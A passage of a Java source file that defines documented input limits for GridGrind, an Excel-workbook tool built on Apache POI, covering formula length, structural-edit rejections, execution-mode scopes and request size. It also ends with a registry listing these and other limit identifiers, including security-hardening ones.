              + ".\n\nGridGrind already rejects out-of-bounds addressed columns on the public request path for\nselectors, column-band operations, column-structural edits, and print-title column bands.");

  /** Maximum Text Characters per Cell. */
  public static final Limit MAXIMUM_TEXT_CHARACTERS_PER_CELL =
      new Limit(
          ID_MAXIMUM_TEXT_CHARACTERS_PER_CELL,
          "Maximum Text Characters per Cell",
          "Excel/POI",
          MAX_CELL_TEXT_LENGTH + " characters",
          List.of(),
          "",
          List.of(),
          "This is the persisted Excel cell-text ceiling; reject oversized authored or reconstructed text before native mutation.");

  /** Maximum Cell Styles per Workbook. */
  public static final Limit MAXIMUM_CELL_STYLES_PER_WORKBOOK =
      new Limit(
          ID_MAXIMUM_CELL_STYLES_PER_WORKBOOK,
          "Maximum Cell Styles per Workbook",
          "Excel/POI",
          MAX_CELL_STYLES + " styles (POI ceiling)",
          List.of(),
          "",
          List.of(),
          "Note: POI's cap ("
              + String.format(Locale.ROOT, "%,d", MAX_CELL_STYLES)
              + ") is more conservative than Excel's (65,490). The POI figure is the\neffective limit when writing via GridGrind.");

  /** Maximum Hyperlinks per Worksheet. */
  public static final Limit MAXIMUM_HYPERLINKS_PER_WORKSHEET =
      new Limit(
          ID_MAXIMUM_HYPERLINKS_PER_WORKSHEET,
          "Maximum Hyperlinks per Worksheet",
          "Excel format",
          MAX_HYPERLINKS + " hyperlinks",
          List.of(),
          "",
          List.of(),
          "This bounds worksheet hyperlink records before appending a new native link relationship.");

  /** Maximum Formula Length. */
  public static final Limit MAXIMUM_FORMULA_LENGTH =
      new Limit(
          ID_MAXIMUM_FORMULA_LENGTH,
          "Maximum Formula Length",
          "Excel format",
          MAX_FORMULA_LENGTH + " characters",
          List.of(),
          "",
          List.of(),
          "Authored formulas are checked before native parse/persistence so oversized text fails predictably.");

  /** Maximum Nested Function Levels. */
  public static final Limit MAXIMUM_NESTED_FUNCTION_LEVELS =
      new Limit(
          ID_MAXIMUM_NESTED_FUNCTION_LEVELS,
          "Maximum Nested Function Levels",
          "Excel format",
          Integer.toString(MAX_NESTED_FUNCTION_LEVELS),
          List.of(),
          "",
          List.of(),
          "Formula shape is bounded before native parsing to retain the workbook format and parser depth contract.");

  /** Maximum Function Arguments. */
  public static final Limit MAXIMUM_FUNCTION_ARGUMENTS =
      new Limit(
          ID_MAXIMUM_FUNCTION_ARGUMENTS,
          "Maximum Function Arguments",
          "Excel/POI",
          Integer.toString(MAX_FUNCTION_ARGUMENTS),
          List.of(),
          "",
          List.of(),
          "Function argument counts are checked against the pinned Excel 2007 workbook version before persistence.");

  /** Structural Edits That Would Move Unsupported Owned Structures. */
  public static final Limit STRUCTURAL_EDITS_THAT_WOULD_MOVE_UNSUPPORTED_OWNED_STRUCTURES =
      new Limit(
          ID_STRUCTURAL_EDITS_THAT_WOULD_MOVE_UNSUPPORTED_OWNED_STRUCTURES,
          "Structural Edits That Would Move Unsupported Owned Structures",
          "GridGrind",
          "Structural inserts are rejected when they would move a table or sheet-owned autofilter; structural deletes and shifts are also rejected when they would move or truncate a data validation",
          List.of("INVALID_REQUEST"),
          "Product-owned `INSERT_ROWS`, `DELETE_ROWS`, `SHIFT_ROWS`, `INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected structure and sheet",
          List.of(
              "INSERT_ROWS",
              "DELETE_ROWS",
              "SHIFT_ROWS",
              "INSERT_COLUMNS",
              "DELETE_COLUMNS",
              "SHIFT_COLUMNS"),
          "Apache POI 5.5.1 does not reliably normalize table refs or sheet autofilter refs when rows or\ncolumns are structurally inserted, deleted, or shifted, and it still leaves data-validation\ncoverage unsafe for delete and shift flows. GridGrind now rebuilds data validations across row and\ncolumn inserts, but it still rejects the remaining unsafe structural edits instead of persisting\nstale workbook XML or silently moving only part of the owned structure.\n\nThe rejection is precise and structure-owned. Example messages include:\n- `INSERT_ROWS cannot move table 'BudgetTable' on sheet 'Budget'; row structural edits that would move tables are not supported`\n- `DELETE_COLUMNS cannot move sheet autofilter A1:C10 on sheet 'Budget'; column structural edits that would move or truncate sheet autofilters are not supported`");

  /** Column Structural Edits While Formulas Are Present. */
  public static final Limit COLUMN_STRUCTURAL_EDITS_WHILE_FORMULAS_ARE_PRESENT =
      new Limit(
          ID_COLUMN_STRUCTURAL_EDITS_WHILE_FORMULAS_ARE_PRESENT,
          "Column Structural Edits While Formulas Are Present",
          "GridGrind",
          "Column structural edits are rejected when the workbook contains any formula cells or formula-defined named ranges",
          List.of("INVALID_REQUEST"),
          "`INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` product-owned message explaining that Apache POI leaves some column references stale",
          List.of("INSERT_COLUMNS", "DELETE_COLUMNS", "SHIFT_COLUMNS"),
          "Apache POI 5.5.1 updates some column references during `shiftColumns(...)`, but not all of them.\nIn direct probes against formula-bearing workbooks, formulas such as `A2&B2` were rewritten while\nothers such as `SUM(B2:B4)` remained stale after the same column move. Formula-defined names have\nthe same risk surface. GridGrind therefore rejects column structural edits whenever formulas or\nformula-defined names are present instead of persisting mixed-reference drift.\n\nExample message:\n- `SHIFT_COLUMNS cannot run while workbook formulas are present; Apache POI leaves some column references stale during column structural edits`");

  /** Destructive Structural Edits Against Range-Backed Named Ranges. */
  public static final Limit DESTRUCTIVE_STRUCTURAL_EDITS_AGAINST_RANGE_BACKED_NAMED_RANGES =
      new Limit(
          ID_DESTRUCTIVE_STRUCTURAL_EDITS_AGAINST_RANGE_BACKED_NAMED_RANGES,
          "Destructive Structural Edits Against Range-Backed Named Ranges",
          "GridGrind",
          "`DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, and `SHIFT_COLUMNS` are rejected when they would truncate a range-backed named range or partially move / overwrite one outside the moved band",
          List.of("INVALID_REQUEST"),
          "Product-owned `DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected named range and sheet",
          List.of("DELETE_ROWS", "SHIFT_ROWS", "DELETE_COLUMNS", "SHIFT_COLUMNS"),
          "Apache POI can safely translate a range-backed named range when the named range is fully contained\ninside the moved row or column band, or when it is completely untouched by the edit. Direct probes\nagainst `deleteRows(...)`, `shiftRows(...)`, `deleteColumns(...)`, and `shiftColumns(...)` showed\nthat destructive overlap produces broken formulas such as `I!#REF!:I!#REF!` and\n`I!#REF!:I!$B$1`. GridGrind therefore rejects only the destructive cases instead of persisting\ninvalid named-range formulas that can later crash workbook rewrites.\n\nExample messages:\n- `DELETE_ROWS cannot move named range 'BudgetWindow' on sheet 'Budget'; row structural edits that would truncate range-backed named ranges are not supported`\n- `SHIFT_COLUMNS cannot move named range 'BudgetWindow' on sheet 'Budget'; column structural edits that would overwrite or partially move range-backed named ranges are not supported`");

  /** Event-Read Execution Mode Scope. */
  public static final Limit EVENT_READ_EXECUTION_MODE_SCOPE =
      new Limit(
          ID_EVENT_READ_EXECUTION_MODE_SCOPE,
          "Event-Read Execution Mode Scope",
          "GridGrind",
          "`execution.mode.type=EVENT_READ` supports only inspection steps, and only `GET_WORKBOOK_SUMMARY` plus `GET_SHEET_SUMMARY` queries",
          List.of("INVALID_REQUEST"),
          "`execution.mode.type=EVENT_READ supports inspection steps only; unsupported step kind: {kind}`, `execution.mode.type=EVENT_READ does not support assertion steps`, or `execution.mode.type=EVENT_READ supports GET_WORKBOOK_SUMMARY and GET_SHEET_SUMMARY only; unsupported read type: {type}`",
          List.of("execution.mode.type", "steps[]"),
          "`EVENT_READ` is the low-memory summary reader backed by POI's XSSF event model. It does not\nmaterialize the full workbook object graph, so GridGrind restricts it to workbook and sheet\nsummary reads only. Unsupported factual reads and analysis reads are rejected at request-validation\ntime instead of silently falling back to the normal in-memory executor.");

  /** Streaming-Write Execution Mode Scope. */
  public static final Limit STREAMING_WRITE_EXECUTION_MODE_SCOPE =
      new Limit(
          ID_STREAMING_WRITE_EXECUTION_MODE_SCOPE,
          "Streaming-Write Execution Mode Scope",
          "GridGrind",
          "`execution.mode.type=STREAMING_WRITE` requires `source.type=NEW`, limits mutation actions to `ENSURE_SHEET` and `APPEND_ROW`, requires `execution.calculation.strategy=DO_NOT_CALCULATE`, allows `markRecalculateOnOpen=true`, requires `ENSURE_SHEET` before any append/assertion/inspection work, and requires at least one `ENSURE_SHEET` mutation",
          List.of("INVALID_REQUEST"),
          "`execution.mode.type=STREAMING_WRITE requires source.type=NEW ...`, `execution.mode.type=STREAMING_WRITE supports ENSURE_SHEET and APPEND_ROW only; unsupported mutation action type: {type}`, `execution.mode.type=STREAMING_WRITE requires execution.calculation.strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE allows execution.calculation.markRecalculateOnOpen=true only when strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any assertion step ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any inspection step ...`, or `execution.mode.type=STREAMING_WRITE requires at least one ENSURE_SHEET mutation ...`",
          List.of("execution.mode.type", "source", "steps[]"),
          "`STREAMING_WRITE` is the low-memory append-oriented writer backed by POI `SXSSF`. It authors only\nnew workbooks and does not expose the full XSSF mutation surface. GridGrind validates the reduced\noperation contract up front so callers get deterministic structured errors instead of half-written\nstreaming workbooks or hidden mode fallback.");

  /** Request JSON Size. */
  public static final Limit REQUEST_JSON_SIZE =
      new Limit(
          ID_REQUEST_JSON_SIZE,
          "Request JSON Size",
          "GridGrind",
          REQUEST_DOCUMENT_LIMIT_BYTES + " bytes",
          List.of("INVALID_REQUEST"),
          "`Request JSON exceeds the maximum size of 16 MiB (16777216 bytes); move large authored payloads into UTF8_FILE, FILE, or STANDARD_INPUT sources.`",
          List.of(
              "--request <path>",
              "GridGrindJson.readRequest(InputStream)",
              "GridGrindJson.readRequest(byte[])"),
          "GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and\n`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI now\nrejects oversized request files before execution starts, and the JSON codec enforces the same\ndocument cap on stdin and byte-array entry points so every transport path fails with one stable\nproduct-owned `INVALID_REQUEST` message.");

  /** Sheet Zoom Percentage. */
  public static final Limit SHEET_ZOOM_PERCENTAGE =
      new Limit(
          ID_SHEET_ZOOM_PERCENTAGE,
          "Sheet Zoom Percentage",
          "GridGrind (enforces Excel limit)",
          MIN_ZOOM_PERCENT + ".." + MAX_ZOOM_PERCENT + " percent",
          List.of("INVALID_REQUEST"),
          "`zoomPercent must be between 10 and 400 inclusive: {n}`",
          List.of("SET_SHEET_ZOOM"),
          "Excel exposes worksheet zoom in the 10% to 400% range. GridGrind validates the authored value up\nfront and reuses the same bound for factual sheet-layout reports so CLI operators and agents see\none stable limit across mutation, help, catalog, and readback surfaces.");

  private static final List<Limit> ALL =
      List.of(
          CELL_RETURNING_READ_COUNT,
          FILE_FORMAT,
          SHEET_NAME_CONTRACT,
          COLUMN_WIDTH,
          ROW_HEIGHT,
          DUPLICATE_STEP_IDS,
          STEP_ID_TOKEN_SHAPE,
          GET_CELLS_ADDRESS_LIST,
          MAXIMUM_ROWS_PER_WORKSHEET,
          MAXIMUM_COLUMNS_PER_WORKSHEET,
          MAXIMUM_TEXT_CHARACTERS_PER_CELL,
          MAXIMUM_CELL_STYLES_PER_WORKBOOK,
          MAXIMUM_HYPERLINKS_PER_WORKSHEET,
          MAXIMUM_FORMULA_LENGTH,
          MAXIMUM_NESTED_FUNCTION_LEVELS,
          MAXIMUM_FUNCTION_ARGUMENTS,
          STRUCTURAL_EDITS_THAT_WOULD_MOVE_UNSUPPORTED_OWNED_STRUCTURES,
          COLUMN_STRUCTURAL_EDITS_WHILE_FORMULAS_ARE_PRESENT,
          DESTRUCTIVE_STRUCTURAL_EDITS_AGAINST_RANGE_BACKED_NAMED_RANGES,
          EVENT_READ_EXECUTION_MODE_SCOPE,
          STREAMING_WRITE_EXECUTION_MODE_SCOPE,
          REQUEST_JSON_SIZE,
          SHEET_ZOOM_PERCENTAGE,
          DDE_FORMULA_INJECTION,
          STEP_COUNT,
          REQUEST_OWNED_PATH_CONTAINMENT,
          ZIP_DECOMPRESSION_LIMITS,
          DDE_REJECTION_IN_ALL_FORMULA_INPUTS,
          URL_SCHEME_ALLOWLIST,
          NO_FOLLOW_REQUEST_PATH_BINDING,
          FILE_BACKED_AUTHORED_INPUT_ISOLATION,
          WEBSERVICE_FORMULA_REJECTION,
          NAMED_RANGE_FORMULA_INJECTION,
          CHART_TITLE_FORMULA_INJECTION,
          UDF_FORMULA_TEMPLATE_INJECTION_DEFENSE_IN_DEPTH,
          HYPERLINK_FORMULA_CONTENT_NOT_VALIDATED_AGAINST_URL_ALLOWLIST,
          RTD_FUNCTION_NOT_BLOCKED,
          WORKBOOK_SOURCE_CONTENT_FORMAT,
          OOXML_WRITE_ENCRYPTION_IS_AGILE_ONLY_AND_STRONG_ONLY,
          MATERIALIZED_WORKSHEET_WORK_PER_PLAN,
          EXPLICIT_DATA_VALIDATION_LIST_FORMULA_LENGTH);

  /** Returns every stable limit entry in identifier order. */
  public static List<Limit> all() {
    return ALL;
  }

  /** Finds one limit without maintaining a second identifier registry. */
  public static Optional<Limit> find(String id) {
    return ALL.stream().filter(limit -> limit.id().equals(id)).findFirst();
  }
}
